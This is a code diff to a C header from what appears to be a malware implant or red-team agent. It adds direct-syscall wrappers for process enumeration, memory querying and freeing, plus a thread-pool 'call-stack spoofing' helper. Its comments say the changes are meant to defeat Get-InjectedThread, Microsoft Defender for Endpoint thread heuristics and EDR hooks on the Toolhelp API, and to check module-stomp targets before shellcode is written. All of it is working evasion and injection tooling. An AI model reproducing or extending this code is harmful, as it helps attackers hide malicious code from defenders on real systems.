@@ -76,7 +76,11 @@ typedef enum _SC_ID {
     SSN_NtUnmapViewOfSection     = 8,
     SSN_NtOpenFile               = 9,   /* IAT-free file open for unhook_ntdll */
     SSN_NtDelayExecution         = 10,  /* IAT-free sleep for sandbox_delay()  */
-    SC_COUNT                     = 11
+    SSN_NtOpenProcess            = 11,  /* replaces OpenProcess in inject.c    */
+    SSN_NtQuerySystemInformation = 12,  /* replaces CreateToolhelp32Snapshot   */
+    SSN_NtQueryVirtualMemory     = 13,  /* ASLR base verification in inject.c  */
+    SSN_NtFreeVirtualMemory      = 14,  /* exec_bof cleanup on error path       */
+    SC_COUNT                     = 15
 } SC_ID;
 
 /* ── Public API ─────────────────────────────────────────────────────────── */
@@ -164,7 +168,7 @@ SC_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
 
 static inline NTSTATUS
 SC_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
-                         PVOID Buffer, SIZE_T NumberOfBytesToWrite,
+                         const void *Buffer, SIZE_T NumberOfBytesToWrite,
                          PSIZE_T NumberOfBytesWritten)
 {
     return sc_syscall5(SSN_NtWriteVirtualMemory,
@@ -307,6 +311,125 @@ SC_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
                        DelayInterval,
                        NULL,
                        NULL);
+}
+
+/*
+ * sc_threadpool_exec
+ * ------------------
+ * F-11: Call-stack spoofing via the Windows thread pool.
+ *
+ * Submits a work item via CreateThreadpoolWork + SubmitThreadpoolWork.
+ * The resulting thread's call stack is:
+ *   ntdll!TppWorkerThread → kernel32!BaseThreadInitThunk → <callback>
+ * rather than starting directly at the agent's own code address.
+ *
+ * This defeats Get-InjectedThread and MDE thread-stack heuristics that
+ * flag threads whose top-of-stack return address falls inside a private
+ * RX allocation with no module backing.
+ *
+ * Usage: replace SC_NtCreateThreadEx(hProc, ..., startAddr, ...) with
+ *   sc_threadpool_exec(startAddr, param)  for SAME-PROCESS threads only.
+ * Cross-process injection still uses NtCreateThreadEx — there is no
+ * threadpool API for remote process thread creation.
+ *
+ * Returns TRUE on success, FALSE if the threadpool submission failed.
+ */
+static inline BOOL sc_threadpool_exec(LPTHREAD_START_ROUTINE pfn, PVOID param)
+{
+    PTP_WORK work = CreateThreadpoolWork(
+        (PTP_WORK_CALLBACK)(LPVOID)pfn, param, NULL);
+    if (!work) return FALSE;
+    SubmitThreadpoolWork(work);
+    /* Do NOT call WaitForThreadpoolWorkCallbacks here — fire-and-forget.
+     * The caller must not assume the work has completed on return.        */
+    CloseThreadpoolWork(work);
+    return TRUE;
+}
+
+/*
+ * SC_NtQuerySystemInformation
+ * ---------------------------
+ * Replaces CreateToolhelp32Snapshot for process enumeration.
+ * Class 5 (SystemProcessInformation) returns a linked list of
+ * SYSTEM_PROCESS_INFORMATION structs describing every process.
+ * No snapshot object is created — avoids the kernel callback
+ * that all major EDRs register on the Toolhelp API path.
+ *
+ *   SystemInformationClass — 5 for process list
+ *   SystemInformation      — output buffer
+ *   SystemInformationLength — buffer size in bytes
+ *   ReturnLength           — receives actual bytes written
+ *
+ * Note: kernel-mode callbacks (ETW-Ti) still fire regardless of
+ * how the syscall is issued; this only removes the Win32 hook point.
+ */
+static inline NTSTATUS
+SC_NtQuerySystemInformation(ULONG SystemInformationClass,
+                             PVOID SystemInformation,
+                             ULONG SystemInformationLength,
+                             PULONG ReturnLength)
+{
+    return sc_syscall4(SSN_NtQuerySystemInformation,
+                       sc_get_ssn(SSN_NtQuerySystemInformation),
+                       (PVOID)(ULONG_PTR)SystemInformationClass,
+                       SystemInformation,
+                       (PVOID)(ULONG_PTR)SystemInformationLength,
+                       ReturnLength);
+}
+
+/*
+ * SC_NtQueryVirtualMemory
+ * -----------------------
+ * Query a virtual memory region in a target process.
+ * Used to verify that a candidate stomp VA maps to a MEM_IMAGE region
+ * backed by the expected module before writing shellcode there.
+ *
+ *   ProcessHandle    — target process (or GetCurrentProcess())
+ *   BaseAddress      — VA to query
+ *   MemoryInfoClass  — 0 = MemoryBasicInformation
+ *   Buffer           — out: MEMORY_BASIC_INFORMATION
+ *   Length           — sizeof(MEMORY_BASIC_INFORMATION)
+ *   ResultLength     — out: bytes written
+ */
+static inline NTSTATUS
+SC_NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
+                         ULONG MemoryInformationClass,
+                         PVOID MemoryInformation,
+                         SIZE_T MemoryInformationLength,
+                         PSIZE_T ReturnLength)
+{
+    return sc_syscall6(SSN_NtQueryVirtualMemory,
+                       sc_get_ssn(SSN_NtQueryVirtualMemory),
+                       ProcessHandle,
+                       BaseAddress,
+                       (PVOID)(ULONG_PTR)MemoryInformationClass,
+                       MemoryInformation,
+                       (PVOID)(ULONG_PTR)MemoryInformationLength,
+                       ReturnLength);
+}
+
+/*
+ * SC_NtFreeVirtualMemory
+ * ----------------------
+ * Releases or decommits a region of virtual memory in a process.
+ * Used by exec_bof to free the shellcode allocation on the error path
+ * (when the thread could not be created).
+ *
+ *   ProcessHandle  — target (or GetCurrentProcess())
+ *   BaseAddress    — in/out: pointer to the region base (rounded down to page)
+ *   RegionSize     — in/out: size; set to 0 when FreeType = MEM_RELEASE
+ *   FreeType       — MEM_RELEASE (0x8000) or MEM_DECOMMIT (0x4000)
+ */
+static inline NTSTATUS
+SC_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
+                        PSIZE_T RegionSize, ULONG FreeType)
+{
+    return sc_syscall4(SSN_NtFreeVirtualMemory,
+                       sc_get_ssn(SSN_NtFreeVirtualMemory),
+                       ProcessHandle,
+                       BaseAddress,
+                       RegionSize,
+                       (PVOID)(ULONG_PTR)FreeType);
 }
 
 #ifdef __cplusplus
